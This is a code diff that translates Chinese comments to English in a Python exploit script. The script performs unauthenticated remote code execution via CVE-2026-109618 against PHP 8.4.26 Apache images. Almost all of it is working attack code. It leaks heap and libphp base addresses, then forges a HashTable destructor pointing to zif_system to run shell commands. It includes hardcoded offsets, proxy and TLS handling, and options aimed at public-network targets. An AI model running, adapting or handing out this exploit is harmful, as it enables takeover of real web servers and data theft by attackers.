@@ -1,23 +1,23 @@
 #!/usr/bin/env python3
 """
-php2shell_rce —— CVE-2026-109618 完整未认证 RCE（keep-alive 三阶段，自包含 socket）。
+php2shell_rce -- CVE-2026-109618 full unauthenticated RCE (three-stage keep-alive, self-contained socket).
 
-针对 php:8.4.26-apache（Debian bookworm）官方镜像 + memory_limit=8M +
-session.upload_progress.enabled=1 + 存在 session_start() 消费点。
+Targets the official php:8.4.26-apache (Debian bookworm) image + memory_limit=8M +
+session.upload_progress.enabled=1 + an existing session_start() sink.
 
-流程：
-  Stage-1  泄漏 Zend MM 堆基址 chunk_base（2MB 对齐）
-  Stage-2  泄漏 libphp 基址（pDestructor=zval_ptr_dtor）
-  Stage-3  rotate 获干净 worker 后，伪造 HashTable(pDestructor=zif_system) 触发 RCE
+Flow:
+  Stage-1  leak the Zend MM heap base chunk_base (2MB aligned)
+  Stage-2  leak the libphp base (pDestructor=zval_ptr_dtor)
+  Stage-3  after rotate obtains a clean worker, forge HashTable(pDestructor=zif_system) to trigger RCE
 
-用法：
+Usage:
   python3 php2shell_rce.py -u http://127.0.0.1:8090/index.php \
       -c 'id>/out/p1' --proof-file /path/to/lab/out/p1 \
       --profile bookworm \
       [--zif-offset 0x465370 --dtor-offset 0x65eb60 --htdata-offset 0x690D8]
 
-依赖：poc_eness/poc_109618.py（build_multipart/parse_cookie/chunk_base_from_cookie/
-libphp_base_from_cookie/Exploit._file_part/_big_field/_fake_payload/rotate）。
+Dependencies: poc_eness/poc_109618.py (build_multipart/parse_cookie/chunk_base_from_cookie/
+libphp_base_from_cookie/Exploit._file_part/_big_field/_fake_payload/rotate).
 """
 import sys, time, struct, argparse, os, socket, re, hashlib
 
@@ -27,25 +27,25 @@ import poc_109618 as P
 
 SID = b'attacksessionid0001'
 
-# bookworm 符号偏移（nm libphp.so 验证）
-ZIF_OFFSET = 0x465370      # zif_system（LOCAL）
-DTOR_OFFSET = 0x65eb60     # zval_ptr_dtor（GLOBAL）
-HTDATA_OFFSET = 0x690D8    # bookworm htdata 偏移
+# bookworm symbol offsets (verified with nm libphp.so)
+ZIF_OFFSET = 0x465370      # zif_system (LOCAL)
+DTOR_OFFSET = 0x65eb60     # zval_ptr_dtor (GLOBAL)
+HTDATA_OFFSET = 0x690D8    # bookworm htdata offset
 
 STAGE1_N = 841             # bookworm profile
-STAGE2_T = 406             # 983 组嵌套数组中第 t 组
+STAGE2_T = 406             # the t-th group among the 983 nested-array groups
 STAGE2_V = 16
 
 
-# ---- TLS 开关（由上层按目标 scheme 设置；exploit 阶段全部走 _dial）----
+# ---- TLS switch (set by the caller from the target scheme; all exploit stages go through _dial) ----
 TLS_STATE = {"enabled": False, "insecure": True, "server_hostname": None}
 
-# ---- 公网链路参数：超时与 Host 头覆盖 ----
+# ---- public-network link parameters: timeout and Host header override ----
 NET_STATE = {"timeout": 120.0, "host_header": None}
 
 
 def set_net(timeout=None, host_header=None):
-    """timeout 覆盖裸 socket 连接/读写；host_header 用于「访问 IP、vhost 认域名」。"""
+    """timeout overrides raw socket connect/read/write; host_header covers reaching by IP when the vhost only accepts a domain name."""
     if timeout:
         NET_STATE["timeout"] = float(timeout)
     if host_header is not None:
@@ -54,7 +54,7 @@ def set_net(timeout=None, host_header=None):
 
 
 def set_tls(enabled, insecure=None, server_hostname=None):
-    """打开/关闭 RCE 阶段的 TLS。insecure=True 时跳过证书校验（自签靶场必需）。"""
+    """Enable/disable TLS for the RCE stages. insecure=True skips certificate verification (required for self-signed labs)."""
     TLS_STATE["enabled"] = bool(enabled)
     if insecure is not None:
         TLS_STATE["insecure"] = bool(insecure)
@@ -94,7 +94,7 @@ def parse_target(url):
 
 
 def read_resp(sock, cap=1 << 22):
-    """读一个 HTTP 响应（支持 Content-Length / chunked / 直到连接关闭）。"""
+    """Read one HTTP response (supports Content-Length / chunked / until connection close)."""
     data = b''
     while b'\r\n\r\n' not in data and len(data) < cap:
         chunk = sock.recv(65536)
@@ -157,7 +157,7 @@ def raw_request(host, port, path, body, boundary, cookie=None, keep_alive=True):
 
 
 def _ua() -> str:
-    """UA 可被 -H "User-Agent: ..." 覆盖；默认保留可识别标识。"""
+    """The UA can be overridden with -H "User-Agent: ..."; the default keeps an identifiable marker."""
     h = getattr(P, "DEFAULT_HEADERS", None) or {}
     for k, v in h.items():
         if k.lower() == "user-agent":
@@ -166,10 +166,10 @@ def _ua() -> str:
 
 
 def _dial(host, port, timeout=None):
-    """连接目标；设置了 P.DEFAULT_PROXY 时经单个代理（http CONNECT / socks5）。
+    """Connect to the target; when P.DEFAULT_PROXY is set, go through a single proxy (http CONNECT / socks5).
 
-    TLS_STATE.enabled 为真时（目标为 https）在此统一套一层 TLS，
-    因此 stage1/2/3、keepalive_pair 等全部阶段自动获得 https 能力。
+    When TLS_STATE.enabled is true (target is https), wrap one TLS layer here,
+    so stage1/2/3, keepalive_pair and every other stage automatically gain https support.
     """
     timeout = timeout or NET_STATE["timeout"]
     proxy = getattr(P, "DEFAULT_PROXY", None) if P is not None else None
@@ -181,7 +181,7 @@ def _dial(host, port, timeout=None):
     return _maybe_tls(sock, host)
 
 def keepalive_pair(host, port, path, first, second, cap1, cap2, cookie1=None):
-    """同一 TCP 连接发 污染A(first) → 解引用B(second)，返回 (respA, respB)。"""
+    """Send pollution A (first) → dereference B (second) on one TCP connection; return (respA, respB)."""
     s = _dial(host, port)
     ba, bb = first
     s.sendall(raw_request(host, port, path, ba, bb, cookie=cookie1, keep_alive=True))
@@ -282,7 +282,7 @@ def leak_chunk_base(host, port, path, ex, attempts=20):
         raw = P.parse_cookie(r2)
         cb = P.chunk_base_from_cookie(raw)
         if cb:
-            print(f"[Stage-1] 泄漏成功 chunk_base={hex(cb)} (raw={len(raw)}B)", flush=True)
+            print(f"[Stage-1] leak succeeded chunk_base={hex(cb)} (raw={len(raw)}B)", flush=True)
             return cb
     return None
 
@@ -298,16 +298,16 @@ def leak_libphp_base(host, port, path, ex, t_pos=STAGE2_T, attempts=30):
         raw = P.parse_cookie(r2)
         base = P.libphp_base_from_cookie(raw, DTOR_OFFSET)
         if base:
-            print(f"[Stage-2] 泄漏成功 libphp_base={hex(base)} (t={t_pos}, raw={len(raw)}B)", flush=True)
+            print(f"[Stage-2] leak succeeded libphp_base={hex(base)} (t={t_pos}, raw={len(raw)}B)", flush=True)
             return base
     return None
 
 
 class ProofWatch:
-    """只接受「本次运行创建/修改过、非空、且匹配 require」的 proof 文件。
+    """Accept only a proof file that this run created or modified, that is non-empty, and that matches require.
 
-    真实目标上 proof 是远端产物；本机路径只有在容器目录挂载时才可读。
-    伪造成功最常见的来源是「路径上本来就有个旧文件」，因此必须比对运行前指纹。
+    On a real target the proof is a remote artifact; a local path is readable only when the container directory is mounted.
+    The most common source of fake success is "an old file already sitting at the path", so compare the pre-run fingerprint.
     """
 
     def __init__(self, path, require=None):
@@ -327,7 +327,7 @@ class ProofWatch:
         return (st.st_mtime_ns, st.st_size, hashlib.sha256(head).hexdigest())
 
     def hit(self):
-        """返回 proof 内容 bytes；不成立返回 None。"""
+        """Return the proof content as bytes; return None when it does not hold."""
         if not self.path:
             return None
         sig = self._sig()
@@ -360,14 +360,14 @@ def do_rce(host, port, path, ex, chunk_base, libphp_base, cmd, htdata_offset,
             r1, r2 = keepalive_pair(host, port, path, first, second,
                                     1 << 22, 1 << 22, cookie1='PHPSESSID=' + 'a' * 32)
         except Exception as e:
-            print(f"[{i}] keep-alive 异常 {type(e).__name__}: {e}", flush=True)
+            print(f"[{i}] keep-alive exception {type(e).__name__}: {e}", flush=True)
             time.sleep(0.3)
             continue
         oom = b'Fatal error' in r1 or b'memory' in r1.lower()
-        print(f"[{i}] 污染A={len(r1)}B oom={oom} 解引用B={len(r2)}B", flush=True)
+        print(f"[{i}] pollution A={len(r1)}B oom={oom} deref B={len(r2)}B", flush=True)
         data = watch.hit()
         if data is not None:
-            print(f"[+] RCE 成功! proof={proof_file} ({len(data)}B，本次运行新写入)", flush=True)
+            print(f"[+] RCE succeeded! proof={proof_file} ({len(data)}B, newly written by this run)", flush=True)
             try:
                 print(data.decode('latin1'), flush=True)
             except Exception:
@@ -378,12 +378,12 @@ def do_rce(host, port, path, ex, chunk_base, libphp_base, cmd, htdata_offset,
 
 
 def main():
-    ap = argparse.ArgumentParser(description='CVE-2026-109618 三阶段 RCE（keep-alive 自包含）')
+    ap = argparse.ArgumentParser(description='CVE-2026-109618 three-stage RCE (keep-alive, self-contained)')
     ap.add_argument('-u', '--url', required=True)
     ap.add_argument('-c', '--cmd', default='id>/out/p1')
-    ap.add_argument('--proof-file', default=None, help='RCE 后 proof 文件路径（主机侧，命中则停止）')
+    ap.add_argument('--proof-file', default=None, help='proof file path after RCE (host side; stop on hit)')
     ap.add_argument('--proof-require', default=None, metavar='REGEX',
-                    help='proof 内容必须匹配的 regex（如 "uid=\\d+"）；不匹配不算成功')
+                    help='regex the proof content must match (e.g. "uid=\\d+"); no match is not success')
     ap.add_argument('--profile', default='bookworm')
     ap.add_argument('--zif-offset', default=ZIF_OFFSET, type=lambda x: int(x, 0))
     ap.add_argument('--dtor-offset', default=DTOR_OFFSET, type=lambda x: int(x, 0))
@@ -392,16 +392,16 @@ def main():
     ap.add_argument('--stage2-t', default=STAGE2_T, type=int)
     ap.add_argument('--rounds', default=30, type=int)
     ap.add_argument('--timeout', default=120.0, type=float,
-                    help='裸 socket 连接/读写超时（公网高延迟/大 body 建议 ≥120）')
+                    help='raw socket connect/read/write timeout (>=120 recommended for high-latency public links / large bodies)')
     ap.add_argument('--host-header', default=None,
-                    help='覆盖 Host 头（按 IP 访问但 vhost 只认域名时用）')
-    ap.add_argument('--skip-leak', action='store_true', help='跳过 Stage-1/2，需 --chunk-base/--libphp-base')
+                    help='override the Host header (when reaching by IP but the vhost only accepts a domain name)')
+    ap.add_argument('--skip-leak', action='store_true', help='skip Stage-1/2; requires --chunk-base/--libphp-base')
     ap.add_argument('--chunk-base', default=None, type=lambda x: int(x, 0))
     ap.add_argument('--libphp-base', default=None, type=lambda x: int(x, 0))
     args = ap.parse_args()
 
     if len(args.cmd.encode()) > 14:
-        print('[!] cmd 不得超过 14 字节（PoC MAX_CMD 限制）')
+        print('[!] cmd must not exceed 14 bytes (PoC MAX_CMD limit)')
         sys.exit(1)
 
     host, port, path = parse_target(args.url)
@@ -419,19 +419,19 @@ def main():
         if chunk_base is None:
             chunk_base = leak_chunk_base(host, port, path, ex)
             if chunk_base is None:
-                print('[!] Stage-1 泄漏失败')
+                print('[!] Stage-1 leak failed')
                 sys.exit(1)
         if libphp_base is None:
             libphp_base = leak_libphp_base(host, port, path, ex, args.stage2_t)
             if libphp_base is None:
-                print('[!] Stage-2 泄漏失败')
+                print('[!] Stage-2 leak failed')
                 sys.exit(1)
 
     print(f'[*] chunk_base={hex(chunk_base)} libphp_base={hex(libphp_base)}', flush=True)
     ok = do_rce(host, port, path, ex, chunk_base, libphp_base, args.cmd,
                 args.htdata_offset, args.zif_offset, args.proof_file, args.rounds,
                 proof_require=args.proof_require)
-    print('[结果] ' + ('RCE 成功' if ok else '未命中（可增加 --rounds 或检查偏移）'), flush=True)
+    print('[result] ' + ('RCE succeeded' if ok else 'no hit (increase --rounds or check the offsets)'), flush=True)
     sys.exit(0 if ok else 2)
 
 
